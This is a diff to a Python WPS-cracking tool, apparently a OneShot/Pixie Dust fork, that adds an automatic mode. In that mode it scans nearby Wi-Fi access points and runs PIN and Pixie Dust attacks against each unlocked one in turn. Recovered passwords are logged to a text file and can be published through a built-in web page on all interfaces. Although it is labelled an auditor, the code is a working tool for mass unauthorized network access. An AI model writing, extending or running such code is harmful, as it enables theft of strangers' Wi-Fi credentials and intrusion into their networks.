@@ -3,17 +3,47 @@
 # Modify History : rofl0r => FARHAN => Mohammad_Alamin (Toxinum) (FARHAN)
 # VERSION 1.0.1
 # Open Source Code.No Need More Modification.
-import sys, subprocess, os, tempfile, shutil, re, codecs, socket, pathlib, time, collections, statistics, collections, csv, http.client, marshal
+import sys, subprocess, os, tempfile, shutil, re, codecs, socket, pathlib, time, collections, statistics, csv, http.client, marshal, select, threading
+from http.server import HTTPServer, BaseHTTPRequestHandler
 from time import sleep 
 from datetime import datetime
 from typing import Dict
+
+class Colors:
+    GREEN = '\033[32m'
+    RED = '\033[31m'
+    YELLOW = '\033[33m'
+    BLUE = '\033[34m'
+    CYAN = '\033[36m'
+    WHITE = '\033[37m'
+    RESET = '\033[0m'
+    BOLD = '\033[1m'
+    DIM = '\033[2m'
+
+def info(msg):
+    print(f"{Colors.DIM}•{Colors.RESET} {msg}")
+
+def success(msg):
+    print(f"{Colors.GREEN}✓{Colors.RESET} {msg}")
+
+def error(msg):
+    print(f"{Colors.RED}✗{Colors.RESET} {msg}")
+
+def warning(msg):
+    print(f"{Colors.YELLOW}!{Colors.RESET} {msg}")
+
+def ani(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.005)
+
+def show_banner():
+    print(f"\n{Colors.BOLD}WPS AUDITOR{Colors.RESET} {Colors.DIM}v1.0.2{Colors.RESET}")
+    print(f"{Colors.DIM}──────────────────────────────────────────{Colors.RESET}")
+
 now = datetime.now()
 now_time = str(now.strftime("%d:%m:%Y - %H:%M:%S"))
-def ani(z):
-	for e in z + '\n':
-		sys.stdout.write(e)
-		sys.stdout.flush()
-		time.sleep(0.004)
 
 class NetworkAddress:
     def __init__(self, mac):
@@ -406,7 +436,7 @@ class BruteforceStatus:
             percentage = int(self.mask) / 11000 * 100
         else:
             percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
-        print('[\033[1;33m*\033[1;37m]  {:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(
+        info('{:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(
             percentage, self.start_time, average_pin_time))
 
     def registerAttempt(self, mask):
@@ -445,6 +475,8 @@ class Companion:
         self.connection_status = ConnectionStatus()
 
         user_home = str(pathlib.Path.home())
+        if user_home == '/':
+            user_home = os.path.dirname(os.path.realpath(__file__))
         self.sessions_dir = f'{user_home}/.WiFi/sessions/'
         self.pixiewps_dir = f'{user_home}/.WiFi/pixiewps/'
         self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
@@ -491,92 +523,90 @@ class Companion:
             if 'Building Message M' in line:
                 n = int(line.split('Building Message M')[1].replace('D', ''))
                 self.connection_status.last_m_message = n
-                print('[\033[1;33m*\033[1;37m] Resiviendo mensajes WPS M{}…'.format(n))
+                info(f'Receiving WPS Message M{n}...')
             elif 'Received M' in line:
                 n = int(line.split('Received M')[1])
                 self.connection_status.last_m_message = n
-                print('[\033[1;33m*\033[1;37m] Recibido mensaje WPS M{}'.format(n))
+                info(f'Received WPS Message M{n}')
                 if n == 5:
-                    print('[\033[1;32m+\033[1;37m] pin probable invalido')
+                    success('M5 received - PIN half potentially valid')
             elif 'Received WSC_NACK' in line:
                 self.connection_status.status = 'WSC_NACK'
-                print('[\033[1;33m*\033[1;37m] Received WSC NACK')
-                print('[\033[1;31m-\033[1;37m] Error: wrong PIN code')
+                info('Received WSC NACK')
+                error('Error: Wrong PIN code')
             elif 'Enrollee Nonce' in line and 'hexdump' in line:
                 self.pixie_creds.e_nonce = get_hex(line)
                 assert(len(self.pixie_creds.e_nonce) == 16*2)
                 if pixiemode:
-                    print('[P] E-Nonce: {}'.format(self.pixie_creds.e_nonce))
+                    print(f'{Colors.CYAN}[P]{Colors.WHITE} E-Nonce: {self.pixie_creds.e_nonce}')
             elif 'DH own Public Key' in line and 'hexdump' in line:
                 self.pixie_creds.pkr = get_hex(line)
                 assert(len(self.pixie_creds.pkr) == 192*2)
                 if pixiemode:
-                    print('[P] PKR: {}'.format(self.pixie_creds.pkr))
+                    print(f'{Colors.CYAN}[P]{Colors.WHITE} PKR: {self.pixie_creds.pkr}')
             elif 'DH peer Public Key' in line and 'hexdump' in line:
                 self.pixie_creds.pke = get_hex(line)
                 assert(len(self.pixie_creds.pke) == 192*2)
                 if pixiemode:
-                    print('[\033[1;32mP\033[1;37m] PKE: {}'.format(self.pixie_creds.pke))
+                    print(f'{Colors.CYAN}[P]{Colors.WHITE} PKE: {self.pixie_creds.pke}')
             elif 'AuthKey' in line and 'hexdump' in line:
                 self.pixie_creds.authkey = get_hex(line)
                 assert(len(self.pixie_creds.authkey) == 32*2)
                 if pixiemode:
-                    print('[\033[1;32mP\033[1;37m] AuthKey: {}'.format(self.pixie_creds.authkey))
+                    print(f'{Colors.CYAN}[P]{Colors.WHITE} AuthKey: {self.pixie_creds.authkey}')
             elif 'E-Hash1' in line and 'hexdump' in line:
                 self.pixie_creds.e_hash1 = get_hex(line)
                 assert(len(self.pixie_creds.e_hash1) == 32*2)
                 if pixiemode:
-                    print('[\033[1;32mP\033[1;37m] E-Hash1: {}'.format(self.pixie_creds.e_hash1))
+                    print(f'{Colors.CYAN}[P]{Colors.WHITE} E-Hash1: {self.pixie_creds.e_hash1}')
             elif 'E-Hash2' in line and 'hexdump' in line:
                 self.pixie_creds.e_hash2 = get_hex(line)
                 assert(len(self.pixie_creds.e_hash2) == 32*2)
                 if pixiemode:
-                    print('[\033[1;32mP\033[1;37m] E-Hash2: {}'.format(self.pixie_creds.e_hash2))
+                    print(f'{Colors.CYAN}[P]{Colors.WHITE} E-Hash2: {self.pixie_creds.e_hash2}')
             elif 'Network Key' in line and 'hexdump' in line:
                 self.connection_status.status = 'GOT_PSK'
                 self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')
         elif ': State: ' in line:
             if '-> SCANNING' in line:
                 self.connection_status.status = 'scanning'
-                print('[\033[1;33m*\033[1;37m] Escaneando…')
+                info('Scanning...')
         elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
             self.connection_status.status = 'WPS_FAIL'
-            print('[\033[1;31m-\033[1;37m] wpa_supplicant returned WPS-FAIL')
-#        elif 'NL80211_CMD_DEL_STATION' in line:
-#            print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
+            error('wpa_supplicant returned WPS-FAIL')
         elif 'Trying to authenticate with' in line:
             self.connection_status.status = 'authenticating'
             if 'SSID' in line:
                 self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
-            print('[\033[1;33m*\033[1;37m] Authenticating…')
+            info('Authenticating...')
         elif 'Authentication response' in line:
-            print('[\033[1;32m+\033[1;37m] Authenticated')
+            success('Authenticated')
         elif 'Trying to associate with' in line:
             self.connection_status.status = 'associating'
             if 'SSID' in line:
                 self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
-            print('[\033[1;33m*\033[1;37m] Conectándose al Punto de Acceso…')
-        elif ('Conectado a' in line) and (self.interface in line):
+            info('Associating with Access Point...')
+        elif ('Conectado a' in line) or ('Connected to' in line) and (self.interface in line):
             bssid = line.split()[-1].upper()
             if self.connection_status.essid:
-                print('[\033[1;32m+\033[1;37m] Conectado a {} (ESSID: {})'.format(bssid, self.connection_status.essid))
+                success(f'Connected to {bssid} (ESSID: {self.connection_status.essid})')
             else:
-                print('[\033[1;32m+\033[1;37m] Conectado a {}'.format(bssid))
+                success(f'Connected to {bssid}')
         elif 'EAPOL: txStart' in line:
             self.connection_status.status = 'eapol_start'
-            print('[\033[1;33m*\033[1;37m] Enviando inicio EAPOL…')
+            info('Sending EAPOL Start...')
         elif 'EAP entering state IDENTITY' in line:
-            print('[\033[1;33m*\033[1;37m] Recibida solicitud de identidad.')
+            info('Identity request received.')
         elif 'using real identity' in line:
-            print('[\033[1;33m*\033[1;37m] Enviando respuesta de identidad…')
+            info('Sending identity response...')
 
         return True
 
     def __runPixiewps(self, showcmd=False, full_range=False):
-        print("[\033[1;33m*\033[1;37m] Running Pixiewps…")
+        info("Running Pixiewps...")
         cmd = self.pixie_creds.get_pixie_cmd(full_range)
         if showcmd:
-            print(cmd)
+            info(f"Command: {cmd}")
         r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                            stderr=sys.stdout, encoding='utf-8', errors='replace')
         print(r.stdout)
@@ -591,9 +621,11 @@ class Companion:
         return False
 
     def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
-        print(f"[\033[1;32m══════════════════════════════════════════════════════════════════════●\033[1;37m\n[\033[1;32m✔\033[1;37m] WIFI  : {essid}")
-        print(f"[\033[1;32m✔\033[1;37m] CONTRASEÑA  : {wpa_psk}")
-        print(f"[\033[1;32m✔\033[1;37m] PIN WPS  : {wps_pin}\n\033[1;32m══════════════════════════════════════════════════════════════════════●\033[1;37m")
+        print(f"\n{Colors.DIM}──────────────────────────────────────────{Colors.RESET}")
+        success(f"{Colors.BOLD}Network{Colors.RESET}   : {essid}")
+        success(f"{Colors.BOLD}Password{Colors.RESET}  : {wpa_psk}")
+        success(f"{Colors.BOLD}WPS PIN{Colors.RESET}   : {wps_pin}")
+        print(f"{Colors.DIM}──────────────────────────────────────────{Colors.RESET}\n")
           
 
     def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
@@ -612,38 +644,39 @@ class Companion:
             if writeTableHeader:
                 csvWriter.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
             csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
-        print(f'[\033[1;33m✓\033[1;37m] Credentials saved to {filename}.txt, {filename}.csv')
+        success(f'Credentials saved to {filename}.txt, {filename}.csv')
 
     def __savePin(self, bssid, pin):
         filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
         with open(filename, 'w') as file:
             file.write(pin)
-        print('[\033[1;33m✓\033[1;37m] PIN saved in {}'.format(filename))
+        success(f'PIN saved in {filename}')
 
     def __prompt_wpspin(self, bssid):
         pins = self.generator.getSuggested(bssid)
         if len(pins) > 1:
-            print(f'PINs generated for {bssid}:')
-            print('{:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
+            print(f'\n{Colors.CYAN}{"PINs generated for " + bssid:<80}{Colors.RESET}')
+            print(f"{'#':<3} | {'PIN':<10} | {'Name'}")
+            print(f"{Colors.CYAN}{'-'*80}{Colors.RESET}")
             for i, pin in enumerate(pins):
                 number = '{})'.format(i + 1)
-                line = '{:<3} {:<10} {:<}'.format(
+                line = '{:<3} | {:<10} | {:<}'.format(
                     number, pin['pin'], pin['name'])
                 print(line)
             while 1:
-                pinNo = input('[\033[1;33m*\033[1;37m] Select the PIN: ')
+                pinNo = input(f'{Colors.YELLOW}[?]{Colors.WHITE} Select the PIN: ')
                 try:
                     if int(pinNo) in range(1, len(pins)+1):
                         pin = pins[int(pinNo) - 1]['pin']
                     else:
                         raise IndexError
                 except Exception:
-                    print('[\033[1;31m+\033[1;37m] Invalid number')
+                    error('Invalid number!')
                 else:
                     break
         elif len(pins) == 1:
             pin = pins[0]
-            print('[\033[1;31m!\033[1;37m] The only probable PIN is selected:', pin['name'])
+            warning(f'The only probable PIN is selected: {pin["name"]}')
             pin = pin['pin']
         else:
             return None
@@ -666,7 +699,12 @@ class Companion:
                 print('[\033[1;31m-\033[1;37m] Something went wrong — check out debug log')
             return False
 
+        start_time = time.time()
+        timeout = 60 # 60 seconds timeout
         while True:
+            if time.time() - start_time > timeout:
+                error('Tiempo de espera agotado (timeout) para la conexión WPS')
+                break
             res = self.__handle_wpas(pixiemode=pixiemode, verbose=verbose)
             if not res:
                 break
@@ -681,7 +719,7 @@ class Companion:
         return False
 
     def single_connection(self, bssid, pin=None, pixiemode=False, showpixiecmd=False,
-                          pixieforce=False, store_pin_on_fail=False):
+                          pixieforce=False, store_pin_on_fail=False, auto=False):
         if not pin:
             if pixiemode:
                 try:
@@ -689,7 +727,9 @@ class Companion:
                     filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                     with open(filename, 'r') as file:
                         t_pin = file.readline().strip()
-                        if input('[\033[1;33m?\033[1;37m] Use previously calculated PIN {}? [n/Y] '.format(t_pin)).lower() != 'n':
+                        if not auto and input('[\033[1;33m?\033[1;37m] Use previously calculated PIN {}? [n/Y] '.format(t_pin)).lower() != 'n':
+                            pin = t_pin
+                        elif auto:
                             pin = t_pin
                         else:
                             raise FileNotFoundError
@@ -697,7 +737,10 @@ class Companion:
                     pin = self.generator.getLikely(bssid) or '12345670'
             else:
                 # If not pixiemode, ask user to select a pin from the list
-                pin = self.__prompt_wpspin(bssid) or '12345670'
+                if auto:
+                    pin = self.generator.getLikely(bssid) or '12345670'
+                else:
+                    pin = self.__prompt_wpspin(bssid) or '12345670'
 
         if store_pin_on_fail:
             try:
@@ -711,6 +754,8 @@ class Companion:
 
         if self.connection_status.status == 'GOT_PSK':
             self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
+            with open('conexiones.txt', 'a', encoding='utf-8') as f:
+                f.write(f"BSSID: {bssid} | ESSID: {self.connection_status.essid} | Password: {self.connection_status.wpa_psk}\n")
             if self.save_result:
                 self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
             # Try to remove temporary PIN file
@@ -724,7 +769,7 @@ class Companion:
             if self.pixie_creds.got_all():
                 pin = self.__runPixiewps(showpixiecmd, pixieforce)
                 if pin:
-                    return self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
+                    return self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True, auto=auto)
                 return False
             else:
                 print('[\033[1;31m!\033[1;37m] Not enough data to run Pixie Dust attack')
@@ -814,6 +859,45 @@ class Companion:
             if args.loop:
                 raise KeyboardInterrupt
 
+    def auto_connection(self, scanner, pixiemode=False, showpixiecmd=False, pixieforce=False, failed_bssids=None):
+        if failed_bssids is None:
+            failed_bssids = set()
+        
+        # Intentar desconectar para liberar el dispositivo antes del escaneo
+        self.sendOnly('DISCONNECT')
+        time.sleep(0.5)
+        
+        networks = scanner.iw_scanner()
+        if not networks:
+            return False
+
+        already_connected = []
+        if os.path.exists('conexiones.txt'):
+            with open('conexiones.txt', 'r', encoding='utf-8') as f:
+                content = f.read()
+                already_connected = re.findall(r'BSSID: ([0-9A-F:]{17})', content, re.IGNORECASE)
+                already_connected = [b.upper() for b in already_connected]
+
+        for _, network in networks.items():
+            bssid = network['BSSID'].upper()
+            if bssid in already_connected:
+                continue
+            if bssid in failed_bssids:
+                continue
+            
+            if network['WPS locked']:
+                info(f'Saltando {bssid} ({network["ESSID"]}) - WPS está bloqueado (Locked)')
+                failed_bssids.add(bssid)
+                continue
+
+            info(f'Intentando conectar a {bssid} ({network["ESSID"]})...')
+            if self.single_connection(bssid, pixiemode=pixiemode, showpixiecmd=showpixiecmd, pixieforce=pixieforce, auto=True):
+                success(f'Credenciales guardadas en conexiones.txt')
+                return True
+            else:
+                failed_bssids.add(bssid)
+                return True
+        return False
     def cleanup(self):
         self.retsock.close()
         self.wpas.terminate()
@@ -853,6 +937,8 @@ class WiFiScanner:
         def handle_network(line, result, networks):
             networks.append(
                     {
+                        'ESSID': '',
+                        'Level': -100,
                         'Security type': 'Unknown',
                         'WPS': False,
                         'WPS locked': False,
@@ -911,9 +997,16 @@ class WiFiScanner:
             networks[-1]['Device name'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
 
         cmd = 'iw dev {} scan'.format(self.interface)
-        proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
-                              stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
-        lines = proc.stdout.splitlines()
+        for i in range(3):
+            proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
+                                stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
+            lines = proc.stdout.splitlines()
+            if lines and lines[0].startswith('command failed: Device or resource busy (-16)'):
+                time.sleep(1)
+                continue
+            else:
+                break
+        
         networks = []
         matchers = {
             re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
@@ -950,96 +1043,84 @@ class WiFiScanner:
         # Putting a list of networks in a dictionary, where each key is a network number in list of networks
         network_list = {(i + 1): network for i, network in enumerate(networks)}
 
+        # Move cursor to top and clear screen efficiently
+        sys.stdout.write("\033[H\033[J")
+        show_banner()
+
         # Printing scanning results as table
         def truncateStr(s, length, postfix='…'):
-            """
-            Truncate string with the specified length
-            @s — input string
-            @length — length of output string
-            """
             if len(s) > length:
                 k = length - len(postfix)
                 s = s[:k] + postfix
             return s
 
-        def colored(text, color=None):
-            """Returns colored text"""
-            if color:
-                if color == 'green':
-                    text = '\033[92m{}\033[00m'.format(text)
-                elif color == 'red':
-                    text = '\033[91m{}\033[00m'.format(text)
-                elif color == 'yellow':
-                    text = '\033[93m{}\033[00m'.format(text)
-                else:
-                    return text
-            else:
-                return text
-            return text
-
         if self.vuln_list:
-            print('INFO: {1} {0} {2} {0} {3}'.format(
-                '|',
-                colored('vulnerable', color='green'),
-                colored('bloqueado', color='red'),
-                colored('guardado', color='yellow')
-            ))
+            print(f"{Colors.DIM}Legend: {Colors.GREEN}● Vulnerable {Colors.RED}● Locked {Colors.YELLOW}● Stored{Colors.RESET}\n")
         
-        
-        print ('\n\033[1;32m╭─────────────────────────────────────────────────────────╮\033[1;37m')
-        print (' ')
+        print(f"{Colors.DIM}{'ID':<4}  {'BSSID':<18}  {'ESSID':<25}  {'SEC':<8}  {'PWR':<4}  {'WPS'}{Colors.RESET}")
 
         network_list_items = list(network_list.items())
         if args.reverse_scan:
             network_list_items = network_list_items[::-1]
+            
         for n, network in network_list_items:
-            number = f'[{n}] '
-            model = '{} {}'.format(network['Model'], network['Model number'])
+            id_str = f"{n}"
             essid = truncateStr(network['ESSID'], 25)
-            deviceName = truncateStr(network['Device name'], 27)
-            line = '{:<4} {:<18} {:<25} {:<4} '.format(
-                number, network['BSSID'], essid,
-                network['Security type'], network['Level'],
-                deviceName, model
-                )
+            wps_status = f"{Colors.RED}L{Colors.RESET}" if network['WPS locked'] else f"{Colors.GREEN}U{Colors.RESET}"
+            line = f"{id_str:<4}  {network['BSSID']:<18}  {essid:<25}  {network['Security type']:<8}  {network['Level']:<4}   {wps_status}"
+            
             if (network['BSSID'], network['ESSID']) in self.stored:
-                print(colored(line, color='yellow'))
+                print(f"{Colors.YELLOW}{line}{Colors.RESET}")
             elif network['WPS locked']:
-                print(colored(line, color='red'))
-            elif self.vuln_list and (model in self.vuln_list):
-                print(colored(line, color='green'))
+                print(f"{Colors.DIM}{line}{Colors.RESET}")
+            elif self.vuln_list and ('{} {}'.format(network['Model'], network['Model number']) in self.vuln_list):
+                print(f"{Colors.BOLD}{line}{Colors.RESET}")
             else:
                 print(line)
 
         return network_list
 
     def prompt_network(self) -> str:
+        # Clear once at the start
         os.system('clear')
-     
-        networks = self.iw_scanner()
-        if not networks:
-            ani('[\033[1;31m-\033[1;37m] Posiblemente!')
-            ani('[\033[1;33mi\033[1;37m] Reiniciar wlan ')
-            ani('[\033[1;33mi\033[1;37m] Desactivar zona wifi')
-            ani('[\033[1;33mi\033[1;37m] activar localización!')
-            for i in range(4, -1,-1):
-              sys.stdout.write("\r[\033[1;33m+\033[1;37m] Auto reinicio en [\033[1;33m"+str(i+1)+"\033[1;37m] segundos!")
-              time.sleep(1)
-              sys.stdout.flush()
-            return self.prompt_network()
-        while 1:
-            try:
-                print('\n\033[1;32m╰─────────────────────────────────────────────────────────╯\033[1;37m')
-                networkNo = input('[\033[1;33m?\033[1;37m] ENTER para buscar): ')
-                if networkNo.lower() in ('r', '0', ''):
-                    return self.prompt_network()
-                elif int(networkNo) in networks.keys():
-                    return networks[int(networkNo)]['BSSID']
-                else:
-                    raise IndexError
-            except Exception:
-                print('[\033[1;31m!\033[1;37m] número invalido ')
+        while True:
+            networks = self.iw_scanner()
+            
+            if not networks:
+                sys.stdout.write("\033[H\033[J")
+                show_banner()
+                error('No networks found. Retrying...')
+                time.sleep(0.5)
+                continue
+                
+            print(f"{Colors.DIM}──────────────────────────────────────────{Colors.RESET}")
+            sys.stdout.write(f'{Colors.BOLD}ID{Colors.RESET} {Colors.DIM}(0.5s refresh): {Colors.RESET}')
+            sys.stdout.flush()
+            
+            rlist, _, _ = select.select([sys.stdin], [], [], 0.5)
+            if rlist:
+                line = sys.stdin.readline().strip()
+                if line.isdigit():
+                    num = int(line)
+                    if num in networks.keys():
+                        return networks[num]['BSSID']
+                    else:
+                        error('Invalid ID')
+                        time.sleep(1)
+                elif line.lower() in ('q', 'x'):
+                    sys.exit(0)
+            else:
+                continue
 
+
+def check_and_disconnect(iface):
+    # Check for active connection
+    cmd = f"iw dev {iface} link"
+    proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, encoding='utf-8')
+    if "Not connected" not in proc.stdout:
+        warning(f"Active connection detected on {iface}. Disconnecting for auditing...")
+        subprocess.run(f"iw dev {iface} disconnect", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(1)
 
 def ifaceUp(iface, down=False):
     if down:
@@ -1088,6 +1169,87 @@ Advanced arguments:
 Example:
     %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K
 """
+
+
+class WebHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header("Content-type", "text/html; charset=utf-8")
+        self.end_headers()
+        
+        rows = []
+        if os.path.exists('conexiones.txt'):
+            try:
+                with open('conexiones.txt', 'r', encoding='utf-8') as f:
+                    for line in f:
+                        if '|' in line:
+                            parts = line.split(' | ')
+                            entry = {}
+                            for p in parts:
+                                if ': ' in p:
+                                    k, v = p.split(': ', 1)
+                                    entry[k.strip()] = v.strip()
+                            if entry:
+                                rows.append(entry)
+            except Exception:
+                pass
+        
+        table_rows = ""
+        for row in rows:
+            table_rows += f'<tr><td data-label="BSSID">{row.get("BSSID", "-")}</td><td data-label="ESSID">{row.get("ESSID", "-")}</td><td data-label="Password" class="pwd">{row.get("Password", "-")}</td></tr>'
+        
+        html = f"""
+        <!DOCTYPE html>
+        <html lang="es">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>WPS Auditor - Contraseñas</title>
+            <meta http-equiv="refresh" content="5">
+            <style>
+                :root {{ --primary: #4CAF50; --bg: #121212; --card: #1e1e1e; --text: #e0e0e0; }}
+                body {{ font-family: 'Segoe UI', sans-serif; background-color: var(--bg); color: var(--text); margin: 0; padding: 20px; }}
+                .container {{ max-width: 900px; margin: 0 auto; }}
+                h1 {{ color: var(--primary); border-bottom: 2px solid var(--primary); padding-bottom: 10px; }}
+                .stats {{ color: #888; margin-bottom: 20px; font-size: 0.9em; }}
+                table {{ width: 100%; border-collapse: collapse; background: var(--card); border-radius: 8px; overflow: hidden; }}
+                th {{ background: #333; color: var(--primary); text-align: left; padding: 12px; }}
+                td {{ padding: 12px; border-bottom: 1px solid #333; }}
+                .pwd {{ font-family: monospace; color: #ffeb3b; font-weight: bold; }}
+                @media (max-width: 600px) {{ 
+                    table, thead, tbody, th, td, tr {{ display: block; }}
+                    th {{ display: none; }}
+                    tr {{ margin-bottom: 15px; border: 1px solid #333; border-radius: 8px; }}
+                    td {{ position: relative; padding-left: 50%; }}
+                    td:before {{ position: absolute; left: 12px; font-weight: bold; color: var(--primary); content: attr(data-label) ": "; }}
+                }}
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <h1>WPS Auditor - En Tiempo Real</h1>
+                <div class="stats">Actualizado: {datetime.now().strftime("%H:%M:%S")} | Auto-refresco: 5s</div>
+                <table>
+                    <thead><tr><th>BSSID</th><th>ESSID</th><th>Password</th></tr></thead>
+                    <tbody>{table_rows if table_rows else '<tr><td colspan="3" style="text-align:center">Esperando contraseñas...</td></tr>'}</tbody>
+                </table>
+            </div>
+        </body>
+        </html>
+        """
+        self.wfile.write(html.encode())
+
+def start_web_server(port=8080):
+    def run():
+        try:
+            server = HTTPServer(('0.0.0.0', port), WebHandler)
+            server.serve_forever()
+        except Exception as e:
+            pass
+    thread = threading.Thread(target=run, daemon=True)
+    thread.start()
+    print(f"{{Colors.GREEN}}[*] {{Colors.WHITE}}Servidor web iniciado en {{Colors.CYAN}}http://localhost:{{port}}{{Colors.RESET}}")
+    return thread
 
 
 if __name__ == '__main__':
@@ -1170,32 +1332,82 @@ if __name__ == '__main__':
         action='store_true',
         help='Verbose output'
         )
+    parser.add_argument(
+        '-A', '--auto',
+        action='store_true',
+        help='Conectar automáticamente a redes disponibles y guardar en conexiones.txt'
+    )
+    parser.add_argument(
+        '--web',
+        action='store_true',
+        help='Exponer una web para ver las contraseñas en tiempo real'
+    )
+    parser.add_argument(
+        '--web-port',
+        type=int,
+        default=8080,
+        help='Puerto para el servidor web (por defecto: 8080)'
+    )
 
     args = parser.parse_args()
 
     if sys.hexversion < 0x03060F0:
         die("The program requires Python 3.6 and above")
+    
     if os.getuid() != 0:
-        die("Run it as root")
+        error("Error: No tienes privilegios de root.")
+        if os.path.exists('/data/data/com.termux/files/usr/bin/tsu'):
+            info("En Termux, usa: tsu -c 'python wps.py ...'")
+        else:
+            info("Usa 'sudo' para ejecutar este script.")
+        sys.exit(1)
+
+    if args.web:
+        start_web_server(args.web_port)
 
     if not ifaceUp(args.interface):
-        die('Unable to up interface "{}"'.format(args.interface))
+        die(f'Unable to up interface "{args.interface}"')
 
+    check_and_disconnect(args.interface)
+
+    failed_bssids = set()
+    companion = None
     while True:
         try:
+            try:
+                with open(args.vuln_list, 'r', encoding='utf-8') as file:
+                    vuln_list = file.read().splitlines()
+            except FileNotFoundError:
+                vuln_list = []
+            scanner = WiFiScanner(args.interface, vuln_list)
+
+            if args.auto:
+                if not companion:
+                    companion = Companion(args.interface, args.write, print_debug=args.verbose)
+                res = companion.auto_connection(scanner, args.pixie_dust, args.show_pixie_cmd, args.pixie_force, failed_bssids)
+                if res:
+                    # Si se intentó una red, continuamos para re-escanear y buscar la siguiente
+                    if args.loop or args.auto:
+                        info("Esperando 5 segundos para el próximo escaneo...")
+                        time.sleep(5)
+                    continue
+                else:
+                    # No hay más redes para intentar en este escaneo
+                    if args.loop or args.auto:
+                        info("No hay nuevas redes para atacar. Esperando 5 segundos...")
+                        time.sleep(5)
+                        continue
+                    else:
+                        break
+
             if not args.bssid:
-                try:
-                    with open(args.vuln_list, 'r', encoding='utf-8') as file:
-                        vuln_list = file.read().splitlines()
-                except FileNotFoundError:
-                    vuln_list = []
-                scanner = WiFiScanner(args.interface, vuln_list)
                 if not args.loop:
-                    print('[\033[1;33m*\033[1;37m] BSSID not specified (--bssid) — scanning for available networks')
+                    info('BSSID not specified (--bssid) — scanning for available networks')
                 args.bssid = scanner.prompt_network()
 
             if args.bssid:
-                companion = Companion(args.interface, args.write, print_debug=args.verbose)
+                if not companion:
+                    companion = Companion(args.interface, args.write, print_debug=args.verbose)
                 if args.bruteforce:
                     companion.smart_bruteforce(args.bssid, args.pin, args.delay)
                 else:
@@ -1207,14 +1419,15 @@ if __name__ == '__main__':
                 args.bssid = None
         except KeyboardInterrupt:
             if args.loop:
-                if input("\n[?] Exit the script (otherwise continue to AP scan)? [N/y] ").lower() == 'y':
-                    ani("\n[\033[1;31m!\033[1;37m] goobyte…")
+                if input(f"\n{Colors.YELLOW}[?]{Colors.WHITE} Exit the script (otherwise continue to AP scan)? [N/y] ").lower() == 'y':
+                    ani(f"\n{Colors.RED}[!] Goodbye!{Colors.RESET}")
                     break
                 else:
                     args.bssid = None
             else:
-                ani("\n[\033[1;31m!\033[1;37m] goobyte…")
+                ani(f"\n{Colors.RED}[!] Goodbye!{Colors.RESET}")
                 break
 
     if args.iface_down:
         ifaceUp(args.interface, down=True)
+
